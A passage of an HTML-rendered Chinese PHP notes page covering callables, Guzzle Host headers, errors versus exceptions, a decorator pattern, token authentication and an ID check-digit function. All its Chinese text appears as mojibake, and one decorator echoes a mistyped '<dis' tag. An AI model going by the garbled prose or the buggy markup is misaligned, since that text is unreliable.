class="params"><span class="string">'functionName'</span></span>); </span></span><br><span class="line"><span class="function"><span class="title">is_callable</span>(<span class="params">[$foo, <span class="string">'bar'</span>]</span>);//<span class="title">$foo</span>-&gt;<span class="title">bar</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"><span class="title">is_callable</span>(<span class="params">[<span class="string">'foo'</span>,<span class="string">'bar'</span>]</span>);//<span class="title">foo</span>::<span class="title">bar</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"><span class="title">is_callable</span>(<span class="params">function(</span>)</span>&#123;&#125;);<span class="comment">//closure</span></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">subscribeSellOrder</span>(<span class="params">SellOrderProcess $sellOrderProcess</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $closure = self::makeClosure($sellOrderProcess, <span class="string">'sellOrdersProcess'</span>);</span><br><span class="line">  $<span class="keyword">this</span>-&gt;redis-&gt;subscribe(RtdataConst::SELL_CHANNEL_NAME, $closure);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">makeClosure</span>(<span class="params">$obj, $method</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Closure::fromCallable([$obj, $method]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/index.php/articles/30767</span></span><br></pre></td></tr></table></figure>
<h3 id="curlç»‘å®šhost"><a href="#curlç»‘å®šhost" class="headerlink" title="curlç»‘å®šhost"></a>curlç»‘å®šhost</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xxx.cn æµ‹è¯•çš„hostä¸º<span class="number">172.16</span><span class="number">.252</span><span class="number">.2</span></span><br><span class="line">$url = <span class="string">"http://172.16.252.2/api/test"</span>;</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> Client([<span class="string">'emitter'</span> =&gt; <span class="keyword">new</span> \App\Services\GuzzleEmitter(<span class="string">'test'</span>)]);</span><br><span class="line">$response = $client-&gt;get($url,array(<span class="string">"timeout"</span>=&gt;<span class="number">3</span>,<span class="string">"connect_timeout"</span>=&gt;<span class="number">2</span>,<span class="string">'headers'</span>=&gt;[<span class="string">'host'</span>=&gt;<span class="string">'xxx.cn'</span>]));</span><br></pre></td></tr></table></figure>
<h3 id="é”™è¯¯å’Œå¼‚å¸¸"><a href="#é”™è¯¯å’Œå¼‚å¸¸" class="headerlink" title="é”™è¯¯å’Œå¼‚å¸¸"></a>é”™è¯¯å’Œå¼‚å¸¸</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/25813</span></span><br><span class="line">é”™è¯¯å¹¶ä¸èƒ½è¢« <span class="keyword">try</span> <span class="keyword">catch</span> æ•æ‰</span><br><span class="line">Parse error è§£æé”™è¯¯   Fatal error è‡´å‘½é”™è¯¯  Warning è­¦å‘Š  Notice æ³¨æ„</span><br><span class="line">error_report è®¾ç½®é”™è¯¯çš„æŠ¥å‘Šçº§åˆ«error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">set_error_handler è®¾ç½®ç”¨æˆ·è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°</span><br><span class="line">set_error_handler(<span class="string">'myErrorFun'</span>); <span class="comment">//æŠŠphpåŸå§‹çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œå˜æˆæˆ‘ä»¬çš„myErrorFunå‡½æ•°å¤„ç†</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myErrorFun</span>(<span class="params">$errno, $message, $file, $line</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    echo <span class="string">'é”™è¯¯ç æ˜¯ï¼š'</span>.$errno.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    echo <span class="string">'é”™è¯¯çš„ä¿¡æ¯æ˜¯'</span>.$message.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    echo <span class="string">'é”™è¯¯çš„æ–‡ä»¶æ˜¯ï¼š'</span>.$file.<span class="string">'&lt;/br&gt;'</span>;</span><br><span class="line">    echo <span class="string">'é”™è¯¯çš„è¡Œæ•°æ˜¯'</span>.$line;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $a; <span class="comment">//aæ˜¯æœªå®šä¹‰çš„å˜é‡</span></span><br><span class="line">é”™è¯¯æ˜¯ç”±äº php è„šæœ¬è‡ªèº«çš„é—®é¢˜å¯¼è‡´çš„å’Œé€»è¾‘æ— å…³ï¼Œå¼‚å¸¸åˆ™æ˜¯ç”±äºé€»è¾‘é—®é¢˜å¯¼è‡´çš„</span><br><span class="line">åœ¨ php7 ä¹‹å‰é”™è¯¯ä¸èƒ½ç”¨ <span class="keyword">try</span> <span class="keyword">catch</span> æ•è·ï¼Œå¼‚å¸¸å¯ä»¥ </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"å¤§æ±Ÿä¸œå»ï¼Œæµªæ·˜å°½ï¼Œåƒå¤é£æµäººç‰©"</span>); <span class="comment">//æŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line">å¼‚å¸¸å¿…é¡»è¦æ‰‹åŠ¨æŠ›å‡ºæ‰è¡Œå¦åˆ™æ•è·ä¸åˆ° æ‰‹åŠ¨æŠ›å‡ºå¼‚å¸¸æ˜¯ php æ¯”è¾ƒé¸¡è‚‹çš„åœ°æ–¹ï¼Œå¼‚å¸¸å¿…é¡»è¦æ‰‹åŠ¨æŠ›å‡ºï¼Œæ‰èƒ½æ•è·åˆ°ï¼Œä½†æ˜¯æ—¢ç„¶å·²ç»çŸ¥é“å“ªé‡Œä¼šå‘ç”Ÿå¼‚å¸¸ï¼Œç›´æ¥è§„é¿ä¸å°±å¯ä»¥äº†å—ï¼Ÿæˆ–è€…é‡å†™é€»è¾‘ï¼Œè¿™å¯èƒ½æ˜¯ php æ¯”è¾ƒç‰¹æ®Šçš„åœ°æ–¹å§</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception $e) &#123; <span class="comment">//ç³»ç»Ÿå†…ç½®çš„å¼‚å¸¸å¤„ç†ç±»</span></span><br><span class="line">    echo $e-&gt;getMessage(); <span class="comment">//è·å–å¼‚å¸¸ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br><span class="line">è‡ªå®šä¹‰çš„å¼‚å¸¸å¤„ç†å‡½æ•°ï¼Œç”¨æ¥å¤„ç†æ²¡æœ‰ç”¨ <span class="keyword">try</span> <span class="keyword">catch</span> æ•è·çš„å¼‚å¸¸ï¼Œå¦‚æœä½ æŠ›å‡ºçš„å¼‚å¸¸æ— äººæ•è·ï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥è¯¥æ–¹æ³• </span><br><span class="line">set_exception_handler(<span class="string">'myexception'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myexception</span>(<span class="params">$exception</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    var_dump($exception-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"æµ‹è¯•ä¸€ä¸‹è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†å‡½"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="è£…é¥°å™¨"><a href="#è£…é¥°å™¨" class="headerlink" title="è£…é¥°å™¨"></a>è£…é¥°å™¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">å°è£…ï¼Œç»§æ‰¿ï¼Œå¤šæ€</span><br><span class="line"></span><br><span class="line">ä»€ä¹ˆæ˜¯å°è£…ï¼Ÿ</span><br><span class="line"></span><br><span class="line">æŠŠå®¢è§‚çš„äº‹ç‰©å°è£…æˆæŠ½è±¡çš„ç±»ï¼Œå¹¶ä¸”ç±»å¯ä»¥æŠŠè‡ªå·±çš„æ•°æ®å’Œæ–¹æ³•åªè®©å¯ä¿¡çš„ç±»æˆ–è€…å¯¹è±¡æ“ä½œï¼Œå¯¹ä¸å¯ä¿¡çš„ç±»è¿›è¡Œä¿¡æ¯çš„éšè—ã€‚ç®€å•çš„è¯´å°±æ˜¯ï¼šå°è£…ä½¿å¯¹è±¡çš„è®¾è®¡è€…ä¸å¯¹è±¡çš„ä½¿ç”¨è€…åˆ†å¼€ï¼Œä½¿ç”¨è€…åªè¦çŸ¥é“å¯¹è±¡å¯ä»¥åšä»€ä¹ˆå°±å¯ä»¥äº†ï¼Œä¸éœ€è¦çŸ¥é“å…·ä½“æ˜¯æ€ä¹ˆå®ç°çš„ã€‚å°è£…å¯ä»¥æœ‰åŠ©äºæé«˜ç±»å’Œç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</span><br><span class="line"></span><br><span class="line">ä»€ä¹ˆæ˜¯ç»§æ‰¿ï¼Ÿ</span><br><span class="line"></span><br><span class="line">ç»§æ‰¿æŒ‡çš„æ˜¯å»ºç«‹ä¸€ä¸ªæ–°çš„æ´¾ç”Ÿç±»ï¼Œä»ä¸€ä¸ªæˆ–å¤šä¸ªå…ˆå‰å®šä¹‰çš„ç±»ä¸­ç»§æ‰¿æ•°æ®å’Œå‡½æ•°ï¼Œå¯ä»¥é‡æ–°å®šä¹‰æˆ–åŠ è¿›æ–°æ•°æ®å’Œå‡½æ•°ï¼Œä»è€Œå»ºç«‹äº†ç±»çš„å±‚æ¬¡æˆ–ç­‰çº§ã€‚</span><br><span class="line"></span><br><span class="line">ä»€ä¹ˆæ˜¯å¤šæ€ï¼Ÿ</span><br><span class="line"></span><br><span class="line">å¤šæ€æ€§æŒ‡çš„æ˜¯ï¼š åŒä¸€æ“ä½œä½œç”¨ä¸ä¸åŒç±»çš„å®ä¾‹ï¼Œå°†äº§ç”Ÿä¸åŒçš„æ‰§è¡Œç»“æœï¼Œå³ä¸åŒç±»çš„å¯¹è±¡æ”¶åˆ°ç›¸åŒçš„æ¶ˆæ¯æ—¶ï¼Œå°†å¾—åˆ°ä¸åŒçš„ç»“æœã€‚</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment"> * è£…é¥°å™¨åŠ¨æ€æ·»åŠ åŠŸèƒ½</span></span><br><span class="line"><span class="comment"> * Class EchoText</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoText</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $decorator = [];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">Index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//è°ƒç”¨è£…é¥°å™¨å‰ç½®æ“ä½œ</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;beforeEcho();</span><br><span class="line">        echo <span class="string">"ä½ å¥½ï¼Œæˆ‘æ˜¯è£…é¥°å™¨ã€‚"</span>;</span><br><span class="line">        <span class="comment">//è°ƒç”¨è£…é¥°å™¨åç½®æ“ä½œ</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;afterEcho();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¢åŠ è£…é¥°å™¨</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addDecorator</span>(<span class="params">Decorator $decorator</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;decorator[] = $decorator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ‰§è¡Œè£…é¥°å™¨å‰ç½®æ“ä½œ å…ˆè¿›å…ˆå‡ºåŸåˆ™</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">beforeEcho</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;decorator <span class="keyword">as</span> $decorator)</span><br><span class="line">            $decorator-&gt;before();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ‰§è¡Œè£…é¥°å™¨åç½®æ“ä½œ å…ˆè¿›åå‡ºåŸåˆ™</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">afterEcho</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tmp = array_reverse($<span class="keyword">this</span>-&gt;decorator);</span><br><span class="line">        foreach ($tmp <span class="keyword">as</span> $decorator)</span><br><span class="line">            $decorator-&gt;after();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è£…é¥°å™¨æ¥å£</span></span><br><span class="line"><span class="comment"> * Class Decorator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">interface Decorator</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">public</span> <span class="title">function</span> <span class="title">after</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/**</span></span><br><span class="line"><span class="function"> * é¢œè‰²è£…é¥°å™¨å®ç°</span></span><br><span class="line"><span class="function"> * <span class="title">Class</span> <span class="title">ColorDecorator</span></span></span><br><span class="line"><span class="function"> */</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ColorDecorator</span> <span class="title">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    protected $color;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$color</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;color = $color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;dis style='color: &#123;$this-&gt;color&#125;'&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å­—ä½“å¤§å°è£…é¥°å™¨å®ç°</span></span><br><span class="line"><span class="comment"> * Class SizeDecorator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SizeDecorator</span> <span class="title">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $size;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$size</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;size = $size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;dis style='font-size: &#123;$this-&gt;size&#125;px'&gt;**"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ä¾‹åŒ–è¾“å‡ºç±»</span></span><br><span class="line">$echo = <span class="keyword">new</span> EchoText();</span><br><span class="line"><span class="comment">//å¢åŠ è£…é¥°å™¨</span></span><br><span class="line">$echo-&gt;addDecorator(<span class="keyword">new</span> ColorDecorator(<span class="string">'red'</span>));</span><br><span class="line"><span class="comment">//å¢åŠ è£…é¥°å™¨</span></span><br><span class="line">$echo-&gt;addDecorator(<span class="keyword">new</span> SizeDecorator(<span class="string">'22'</span>));</span><br><span class="line"><span class="comment">//è¾“å‡ºhttps://learnku.com/articles/30034</span></span><br><span class="line">$echo-&gt;Index();</span><br></pre></td></tr></table></figure>
<h3 id="ç†è§£-cookieã€sessionã€token"><a href="#ç†è§£-cookieã€sessionã€token" class="headerlink" title="ç†è§£ cookieã€sessionã€token"></a>ç†è§£ cookieã€sessionã€token</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sessionè¿™å¯¹æœåŠ¡å™¨è¯´æ˜¯ä¸€ä¸ªå·¨å¤§çš„å¼€é”€ ï¼Œ ä¸¥é‡çš„é™åˆ¶äº†æœåŠ¡å™¨æ‰©å±•èƒ½åŠ›ï¼Œ æ¯”å¦‚è¯´æˆ‘ç”¨ä¸¤ä¸ªæœºå™¨ç»„æˆäº†ä¸€ä¸ªé›†ç¾¤ï¼Œ å° F é€šè¿‡æœºå™¨ A ç™»å½•äº†ç³»ç»Ÿï¼Œ é‚£ session id ä¼šä¿å­˜åœ¨æœºå™¨ A ä¸Šï¼Œ å‡è®¾å° F çš„ä¸‹ä¸€æ¬¡è¯·æ±‚è¢«è½¬å‘åˆ°æœºå™¨ B æ€ä¹ˆåŠï¼Ÿæœºå™¨ B å¯æ²¡æœ‰å° F çš„ session id å•Šã€‚æœ‰æ—¶å€™ä¼šé‡‡ç”¨ä¸€ç‚¹å°ä¼ä¿©ï¼šsession sticky ï¼Œ å°±æ˜¯è®©å° F çš„è¯·æ±‚ä¸€ç›´ç²˜è¿åœ¨æœºå™¨ A ä¸Šï¼Œ ä½†æ˜¯è¿™ä¹Ÿä¸ç®¡ç”¨ï¼Œ è¦æ˜¯æœºå™¨ A æŒ‚æ‰äº†ï¼Œ è¿˜å¾—è½¬åˆ°æœºå™¨ B å»ã€‚é‚£åªå¥½åš session çš„å¤åˆ¶äº†ï¼Œ æŠŠ session id åœ¨ä¸¤ä¸ªæœºå™¨ä¹‹é—´æ¬æ¥æ¬å»ï¼Œ å¿«ç´¯æ­»äº†ã€‚</span><br><span class="line">å° F å·²ç»ç™»å½•äº†ç³»ç»Ÿï¼Œ æˆ‘ç»™ä»–å‘ä¸€ä¸ªä»¤ç‰Œ tokenï¼Œ é‡Œè¾¹åŒ…å«äº†å° F çš„ user idï¼Œ ä¸‹ä¸€æ¬¡å° F å†æ¬¡é€šè¿‡ Http è¯·æ±‚è®¿é—®æˆ‘çš„æ—¶å€™ï¼Œ æŠŠè¿™ä¸ª token é€šè¿‡ Http header å¸¦è¿‡æ¥ä¸å°±å¯ä»¥äº†ã€‚*</span><br><span class="line"></span><br><span class="line">ä¸è¿‡è¿™å’Œ session id æ²¡æœ‰æœ¬è´¨åŒºåˆ«å•Šï¼Œ ä»»ä½•äººéƒ½å¯ä»¥å¯ä»¥ä¼ªé€ ï¼Œ æ‰€ä»¥æˆ‘å¾—æƒ³ç‚¹å„¿åŠæ³•ï¼Œ è®©åˆ«äººä¼ªé€ ä¸äº†ã€‚</span><br><span class="line"></span><br><span class="line">é‚£å°±å¯¹æ•°æ®åšä¸€ä¸ªç­¾åå§ï¼Œ æ¯”å¦‚è¯´æˆ‘ç”¨ HMAC-SHA256 ç®—æ³•ï¼ŒåŠ ä¸Šä¸€ä¸ªåªæœ‰æˆ‘æ‰çŸ¥é“çš„å¯†é’¥ï¼Œ å¯¹æ•°æ®åšä¸€ä¸ªç­¾åï¼Œ æŠŠè¿™ä¸ªç­¾åå’Œæ•°æ®ä¸€èµ·ä½œä¸º tokenï¼Œ ç”±äºå¯†é’¥åˆ«äººä¸çŸ¥é“ï¼Œ å°±æ— æ³•ä¼ªé€  token äº†ã€‚</span><br><span class="line"></span><br><span class="line">åŸºäº Token çš„èº«ä»½éªŒè¯çš„è¿‡ç¨‹å¦‚ä¸‹:</span><br><span class="line"></span><br><span class="line">ç”¨æˆ·é€šè¿‡ç”¨æˆ·åå’Œå¯†ç å‘é€è¯·æ±‚ã€‚</span><br><span class="line">ç¨‹åºéªŒè¯ã€‚</span><br><span class="line">ç¨‹åºè¿”å›ä¸€ä¸ªç­¾åçš„ token ç»™å®¢æˆ·ç«¯ã€‚</span><br><span class="line">å®¢æˆ·ç«¯å‚¨å­˜ token, å¹¶ä¸”æ¯æ¬¡ç”¨äºæ¯æ¬¡å‘é€è¯·æ±‚ã€‚</span><br><span class="line">æœåŠ¡ç«¯éªŒè¯ token å¹¶è¿”å›æ•°æ®ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30051</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†å‰²å­—ç¬¦ä¸²"><a href="#åˆ†å‰²å­—ç¬¦ä¸²" class="headerlink" title="åˆ†å‰²å­—ç¬¦ä¸²"></a>åˆ†å‰²å­—ç¬¦ä¸²</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params">$string</span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_string($string)) &#123;</span><br><span class="line">            <span class="keyword">return</span> preg_split(<span class="string">'/(?&lt;!^)(?!$)/u'</span>, $string);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">    &gt;&gt;&gt; mb_str_split(<span class="string">'æˆ‘æ˜¯è°'</span>)</span><br><span class="line">    =&gt; [</span><br><span class="line">         <span class="string">"æˆ‘"</span>,</span><br><span class="line">         <span class="string">"æ˜¯"</span>,</span><br><span class="line">         <span class="string">"è°"</span>,</span><br><span class="line">       ]</span><br></pre></td></tr></table></figure>
<h3 id="è®¡ç®—èº«ä»½è¯çš„æœ€åä¸€ä½éªŒè¯ç "><a href="#è®¡ç®—èº«ä»½è¯çš„æœ€åä¸€ä½éªŒè¯ç " class="headerlink" title="è®¡ç®—èº«ä»½è¯çš„æœ€åä¸€ä½éªŒè¯ç "></a>è®¡ç®—èº«ä»½è¯çš„æœ€åä¸€ä½éªŒè¯ç </h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @functionName è®¡ç®—èº«ä»½è¯çš„æœ€åä¸€ä½éªŒè¯ç </span></span><br><span class="line"><span class="comment">     * @description  æ ¹æ®å›½å®¶æ ‡å‡†GB 11643-1999ï¼Œå‰æå¿…é¡»æ˜¯18ä½çš„è¯ä»¶å·</span></span><br><span class="line"><span class="comment">     *https://github.com/alicfeng/identity-card</span></span><br><span class="line"><span class="comment">     * @param string $idBody è¯ä»¶å·ç çš„å‰17ä½æ•°å­—</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return bool|mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">calculateCode</span>(<span class="params">$idBody</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">17</span> != strlen($idBody)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åŠ æƒå› å­</span></span><br><span class="line">        $factor = [<span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>];</span><br><span class="line">        <span class="comment">//æ ¡éªŒç å¯¹åº”å€¼</span></span><br><span class="line">        $code     = [<span class="string">'1'</span>, <span class="string">'0'</span>, <span class="string">'X'</span>, <span class="string">'9'</span>, <span class="string">'8'</span>, <span class="string">'7'</span>, <span class="string">'6'</span>, <span class="string">'5'</span>, <span 